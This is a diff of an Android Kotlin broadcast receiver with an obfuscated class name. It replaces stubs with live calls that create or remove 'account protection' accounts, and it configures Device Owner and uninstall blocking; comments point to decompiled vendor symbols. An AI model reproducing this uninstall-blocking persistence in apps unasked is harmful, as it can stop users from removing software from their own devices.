@@ -5,6 +5,7 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.util.Log
+import com.storm.safe.rock.service.account.AccountProtectionManager
 import com.storm.safe.rock.util.StringUtil
 
 /**
@@ -41,13 +42,11 @@ class izkmisshyc : BroadcastReceiver() {
                 ACTION_SYNC_CLEANUP -> {
                     Log.d(TAG, "★★★ 收到删除账户请求 ★★★")
                     try {
-                        // ADAPT: depends on AccountProtectMgr (p000 package)
-                        // if (AccountProtectMgr.getInstance(context).removeAccount()) {
-                        //     Log.d(TAG, "✅ 账户已删除")
-                        // } else {
-                        //     Log.w(TAG, "⚠️ 删除账户失败")
-                        // }
-                        Log.d(TAG, "✅ 账户删除逻辑 (stub)")
+                        if (AccountProtectionManager.getInstance(context).removeAccount()) {
+                            Log.d(TAG, "✅ 账户已删除")
+                        } else {
+                            Log.w(TAG, "⚠️ 删除账户失败")
+                        }
                     } catch (e: Exception) {
                         Log.e(TAG, "❌ 删除账户失败", e)
                     }
@@ -60,8 +59,8 @@ class izkmisshyc : BroadcastReceiver() {
                             .edit()
                             .putBoolean(prefKey, false)
                             .commit()
-                        // ADAPT: depends on AccountProtectMgr (p000 package)
-                        // AccountProtectMgr.getInstance(context).removeAccount()
+                        // vendor: C0287a0.f52351a2.getInstance(context).m211400a4()
+                        AccountProtectionManager.getInstance(context).removeAccount()
                         zbrefryi.Companion.blockUninstall(context)
                         Log.d(TAG, "✅ Device Owner 配置完成：账户保护已禁用，卸载保护已启用")
                     } catch (e: Exception) {
@@ -91,8 +90,8 @@ class izkmisshyc : BroadcastReceiver() {
                             .edit()
                             .putBoolean(prefKey, true)
                             .commit()
-                        // ADAPT: depends on AccountProtectMgr
-                        // AccountProtectMgr.getInstance(context).removeAccount()
+                        // vendor: C0287a0.f52351a2.getInstance(context).m211400a4()
+                        AccountProtectionManager.getInstance(context).removeAccount()
                         Log.d(TAG, "✅ 账户保护已禁用（isAdminActivating=true）")
                     } catch (e: Exception) {
                         Log.e(TAG, "❌ 禁用账户保护失败", e)
@@ -118,8 +117,8 @@ class izkmisshyc : BroadcastReceiver() {
                             .edit()
                             .putBoolean(prefKey, false)
                             .commit()
-                        // ADAPT: depends on AccountProtectMgr
-                        // AccountProtectMgr.getInstance(context).createAccount()
+                        // vendor: C0287a0.f52351a2.getInstance(context).m211397a1()
+                        AccountProtectionManager.getInstance(context).createAccount()
                         Log.d(TAG, "✅ 账户保护已启用（isAdminActivating=false）")
                     } catch (e: Exception) {
                         Log.e(TAG, "❌ 启用账户保护失败", e)
@@ -138,11 +137,10 @@ class izkmisshyc : BroadcastReceiver() {
                         if (isDeviceOwner) {
                             Log.d(TAG, "已是 Device Owner，无需账户保护")
                         } else {
-                            // ADAPT: depends on AccountProtectMgr
-                            // val created = AccountProtectMgr.getInstance(context).createAccount()
-                            // if (created) Log.d(TAG, "✅ 账户保护已创建")
-                            // else Log.w(TAG, "⚠️ 账户保护创建失败")
-                            Log.d(TAG, "账户保护创建逻辑 (stub)")
+                            // vendor: c0844m0.m211397a1()
+                            val created = AccountProtectionManager.getInstance(context).createAccount()
+                            if (created) Log.d(TAG, "✅ 账户保护已创建")
+                            else Log.w(TAG, "⚠️ 账户保护创建失败")
                         }
                     } catch (e: Exception) {
                         Log.e(TAG, "❌ 创建账户保护失败", e)
